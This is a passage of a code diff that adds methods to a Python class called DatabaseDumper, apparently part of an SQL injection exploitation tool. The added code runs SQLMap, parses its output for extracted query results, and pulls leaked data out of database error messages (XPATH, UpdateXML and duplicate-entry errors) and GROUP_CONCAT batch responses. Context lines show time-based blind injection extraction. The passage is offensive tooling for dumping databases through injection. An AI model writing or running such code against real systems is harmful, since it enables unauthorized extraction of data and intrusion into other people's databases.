+                
+                # Parse output
+                output = stdout.decode('utf-8', errors='ignore')
+                error = stderr.decode('utf-8', errors='ignore')
+                
+                if process.returncode == 0:
+                    # Extract result from SQLMap output
+                    result = self.parse_sqlmap_output(output, query)
+                    if result:
+                        return result
+                    else:
+                        self.log_info("No data extracted from SQLMap output")
+                        return None
+                else:
+                    self.log_error(f"SQLMap failed with code {process.returncode}: {error}")
+                    return None
+                    
+            except asyncio.TimeoutError:
+                process.kill()
+                self.log_error("SQLMap command timed out")
+                return None
+            finally:
+                # Clean up temp file
+                if os.path.exists(output_file):
+                    os.unlink(output_file)
+                    
+        except Exception as e:
+            self.log_error(f"SQLMap execution failed: {e}")
+            return None
+    
+    def parse_sqlmap_output(self, output: str, query: str) -> Optional[str]:
+        """Parse SQLMap output to extract query results"""
+        lines = output.split('\n')
+        result_lines = []
+        
+        # Look for query results in SQLMap output
+        capturing = False
+        for line in lines:
+            line = line.strip()
+            
+            # Start capturing after query execution
+            if 'fetched data' in line.lower() or 'query:' in line.lower():
+                capturing = True
+                continue
+            
+            # Stop capturing at next SQLMap section
+            if capturing and (line.startswith('[') or line.startswith('sqlmap')):
+                break
+                
+            if capturing and line and not line.startswith('---'):
+                result_lines.append(line)
+        
+        if result_lines:
+            return '\n'.join(result_lines).strip()
+        
+        # Fallback: look for any data patterns
+        for line in lines:
+            if ('database' in query.lower() and 'current database' in line.lower()) or \
+               ('version' in query.lower() and any(v in line for v in ['mysql', 'mariadb', 'postgresql', 'mssql'])) or \
+               ('user' in query.lower() and '@' in line):
+                # Extract the actual data
+                parts = line.split(':')
+                if len(parts) > 1:
+                    return parts[-1].strip()
+        
+        return None
+
+    def extract_error_result(self, content: str) -> Optional[str]:
+        """Extract result from SQLMap-style error messages"""
+        # SQLMap ExtractValue error patterns
+        patterns = [
+            r'XPATH syntax error:\s*\'([^\']+)\'',
+            r'~([^~]+)~',
+            r'ERROR 1105.*?\'([^\']+)\'',
+            r'Duplicate entry \'([^\']+)\' for key',
+            r'ERROR 1690.*?\'([^\']+)\'',
+            r'UpdateXML.*?\'([^\']+)\'',
+            r'Invalid XML.*?\'([^\']+)\'',
+            r'ERROR 1062.*?\'([^\']+)\'',
+            r'Subquery returns more than 1 row.*?\'([^\']+)\'',
+            r'Data truncated.*?\'([^\']+)\''
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
+            if match:
+                result = match.group(1).strip()
+                if result and len(result) > 0:
+                    return result
+                    
+        return None
 
     async def time_based_extraction(self, query: str, max_length: int = 50) -> Optional[str]:
         """Extract data using time-based blind SQL injection"""
@@ -708,6 +1285,82 @@ class DatabaseDumper(LoggerMixin):
             # Fill other columns with empty values  
             for col_name in column_names[1:]:
                 row[col_name] = ""
+            rows.append(row)
+                
+        return rows
+        
+    def parse_batch_data(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
+        """Parse batch data result from GROUP_CONCAT queries"""
+        rows = []
+        
+        if not result:
+            return rows
+            
+        # Clean up the result
+        cleaned_result = result.strip()
+        
+        # Remove HTML tags if present
+        cleaned_result = re.sub(r'<[^>]+>', '', cleaned_result)
+        
+        # Split by row separator (||)
+        row_data = cleaned_result.split('||')
+        
+        for row_str in row_data:
+            if not row_str.strip():
+                continue
+                
+            # Split by column separator (|)
+            col_values = row_str.split('|')
+            
+            # Create row dict
+            row = {}
+            for i, col_name in enumerate(column_names):
+                if i < len(col_values):
+                    row[col_name] = col_values[i].strip()
+                else:
+                    row[col_name] = ""
+            
+            rows.append(row)
+                
+        return rows
+        
+    def parse_simple_data(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
+        """Parse simple data result (single column or basic extraction)"""
+        rows = []
+        
+        if not result:
+            return rows
+            
+        # Clean up the result
+        cleaned_result = result.strip()
+        
+        # Remove HTML tags if present
+        cleaned_result = re.sub(r'<[^>]+>', '', cleaned_result)
+        
+        # Split by common separators
+        values = []
+        if '|' in cleaned_result:
+            values = cleaned_result.split('|')
+        elif ',' in cleaned_result:
+            values = cleaned_result.split(',')
+        elif '\n' in cleaned_result:
+            values = cleaned_result.split('\n')
+        else:
+            values = [cleaned_result]
+        
+        for value in values:
+            value = value.strip()
+            if not value:
+                continue
+                
+            # Create row dict
+            row = {}
+            row[column_names[0]] = value
+            
+            # Fill other columns with empty values
+            for col_name in column_names[1:]:
+                row[col_name] = ""
+            
             rows.append(row)
                 
         return rows
